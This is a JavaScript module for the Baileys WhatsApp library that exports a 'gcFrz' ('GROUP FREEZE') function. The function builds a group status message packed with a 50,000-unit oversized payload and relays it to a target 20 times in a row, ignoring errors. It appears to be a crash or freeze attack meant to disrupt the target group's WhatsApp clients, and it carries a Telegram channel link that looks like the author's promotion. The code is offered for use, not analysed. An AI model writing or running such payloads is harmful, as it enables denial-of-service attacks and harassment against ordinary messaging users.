
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

async function gcFrz(SYxS7, target) {
    const superSpam = getSuperPayload(50000);
    const payload = {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: superSpam,
                    matchedText: "https://t.me/devor6core",
                    contextInfo: {
                        externalAdReply: {
                            title: "GROUP FREEZE",
                            body: superSpam,
                            showAdAttribution: true
                        }
                    }
                }
            }
        }
    };

    for (let i = 0; i < 20; i++) {
        try {
            await SYxS7.relayMessage(target, payload, { participant: { jid: target } });
            await new Promise(res => setTimeout(res, 300));
        } catch (e) {}
    }
}

module.exports = { gcFrz };
